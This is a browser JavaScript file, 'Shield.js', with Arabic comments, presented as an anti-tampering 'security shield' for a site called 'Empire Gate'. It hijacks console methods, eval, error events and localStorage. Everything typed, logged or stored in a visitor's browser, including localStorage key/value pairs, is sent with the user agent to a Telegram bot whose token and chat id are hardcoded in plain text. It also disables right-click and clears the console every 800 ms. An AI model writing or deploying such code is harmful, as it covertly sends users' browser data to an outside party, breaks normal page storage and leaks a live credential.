/**
 * Shield.js - نظام الحظر الشامل وواجهة الفخامة الأمنية
 * المطور: إمبراطورية الظل
 */

const SHIELD_CONFIG = {
    telegramToken: "8117644349:AAHvnY5e-Q1yQuGY0J4iOOBl84Sa1rt_NP0",
    chatId: "7664410054",
    gateName: "Empire Gate"
};

// دالة إرسال البيانات الفورية للتليجرام
async function sendShieldAlert(attackType, details) {
    const text = `🚨 *[تنبيه أمني - نظام الحظر الشامل]* 🚨\n\n` +
                 `⚠️ *نوع المحاولة:* ${attackType}\n` +
                 `🌐 *المنصة:* ${SHIELD_CONFIG.gateName}\n` +
                 `📱 *المتصفح:* ${navigator.userAgent}\n` +
                 `📝 *البيانات:* \n\`\`\`\n${details}\n\`\`\``;

    const url = `https://api.telegram.org/bot${SHIELD_CONFIG.telegramToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: SHIELD_CONFIG.chatId, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) {}
}

// =================================================================
// الجزء الأول: واجهة الفخامة والتحذير البصري (Luxury Warning UI)
// =================================================================
const LuxuryBanner = {
    show() {
        // تنظيف الشاشة أولاً لحظر أي مخلفات برمجية
        console.clear();

        // تصميم الشعار الفخم (ASCII Art)
        const asciiArt = `
█████████████████████████████████████████████████████████████
█                                                           █
█    ████████╗██╗  ██╗███████╗    ███████╗███╗   ███╗██████╗    █
█    ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝████╗ ████║██╔══██╗   █
█       ██║   ███████║█████╗      █████╗  ██╔████╔██║██████╔╝   █
█       ██║   ██╔══██║██╔══╝      ██╔══╝  ██║╚██╔╝██║██╔═══╝    █
█       ██║   ██║  ██║███████╗    ███████╗██║ ╚═╝ ██║██║        █
█       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝╚═╝        █
█                                                           █
█████████████████████████████████████████████████████████████
        `;

        // الأنماط اللمسية بالألوان المطلوبة (الأحمر والأرجواني الفخم)
        const purpleStyle = 'color: #8A2BE2; font-weight: bold; font-size: 12px; background: #0b001a; text-shadow: 0 0 5px #8A2BE2;';
        const redTitleStyle = 'color: #FF0055; font-weight: bold; font-size: 26px; font-family: "Courier New", monospace; text-shadow: 0 0 10px #FF0055, 0 0 20px #FF0055; background: #000; padding: 10px; border: 2px solid #FF0055; border-radius: 5px;';
        const warningStyle = 'color: #FF3333; font-weight: bold; font-size: 14px; background: #110000; padding: 5px; border-left: 4px solid #FF0055;';
        const subTextStyle = 'color: #A9A9A9; font-style: italic; font-size: 11px;';

        // طباعة الشعار والعناوين الفخمة
        this.rawLog(asciiArt, purpleStyle);
        this.rawLog("\n  [ EMPIRE SECURITY PROTOCOL ACTIVATED ]  ", redTitleStyle);
        this.rawLog("\n[!] تحذير أمني: البوابة محمية بالكامل. تم تجميد كافة العمليات التفاعلية.", warningStyle);
        this.rawLog("[!] نظام التنصت النشط يعيد توجيه مدخلاتك إلى المطور فوراً.\n", warningStyle);
        this.rawLog("-------------------------------------------------------------------------", purpleStyle);
        this.rawLog(" Access Denied - Unauthorized Terminal Tampering Detected.", subTextStyle);
        this.rawLog("-------------------------------------------------------------------------", purpleStyle);
    },

    // دالة داخلية للطباعة المباشرة قبل الحظر الشامل
    rawLog(text, style) {
        const originalLog = Function.prototype.bind.call(console.log, console);
        originalLog(`%c${text}`, style);
    }
};

// =================================================================
// الجزء الثاني: الحظر الشامل والتدمير التام لوظائف الكونسول (Total Blockade)
// =================================================================
const AbsoluteBlockade = {
    init() {
        const methods = ['log', 'warn', 'error', 'info', 'debug', 'clear', 'table', 'dir', 'trace'];
        
        // تدمير وظائف الطباعة ومنع عرض أي مسارات أو ملفات
        methods.forEach(method => {
            console[method] = function(...args) {
                const outputText = args.join(' ');
                
                // منع إظهار أي ملفات أو مسارات حساسة وإرسالها للبوت
                if (outputText.length > 0) {
                    sendShieldAlert(`محاولة استدعاء دالة كونسول (${method})`, outputText);
                }
                
                // تنظيف فوري لعرض الواجهة الفخمة وحذف البيانات المدخلة
                LuxuryBanner.show();
            };
        });

        // حظر دالة الإدخال والتحكم عبر كود منع الاستعلامات ومسح الذاكرة المؤقتة
        setInterval(() => {
            LuxuryBanner.show();
        }, 800); // تحديث وتطهير مستمر كل أقل من ثانية لمنع أي نص من البقاء

        // خطف الأخطاء الناتجة عن محاولات المهاجم البرمجية وإخفاء مسارها
        window.addEventListener('error', (e) => {
            e.preventDefault(); // منع المتصفح من عرض الخطأ الأحمر التقليدي الذي يكشف الأسطر
            sendShieldAlert("محاولة كتابة أمر خاطئ", `Error: ${e.message}`);
            LuxuryBanner.show();
        });
    }
};

// =================================================================
// الجزء الثالث: حظر التخزين وأدوات الوصول (Storage & Core Lock)
// =================================================================
const CoreGateShield = {
    init() {
        // رفض قاطع للتخزين وعودة بـ null
        Object.defineProperty(window, 'localStorage', {
            value: {
                setItem: function(k, v) { sendShieldAlert("تعديل التخزين", `${k}=${v}`); return null; },
                getItem: function() { return null; },
                removeItem: function() { return null; },
                clear: function() {}
            },
            writable: false,
            configurable: false
        });

        // منع دالة التنفيذ eval تماماً
        window.eval = function(code) {
            sendShieldAlert("محاولة تنفيذ كود عبر eval", code);
            LuxuryBanner.show();
            return null;
        };

        // تعطيل زر الفأرة الأيمن
        document.addEventListener('contextmenu', (e) => e.preventDefault());
    }
};

// =================================================================
// تشغيل الدروع والنظام الرادع
// =================================================================
(function() {
    CoreGateShield.init();      // قفل النواة والتخزين
    AbsoluteBlockade.init();   // التدمير التام للكونسول وفلترة المسارات
    LuxuryBanner.show();       // إطلاق شعار الفخامة والتحذير الأرجواني والأحمر
})();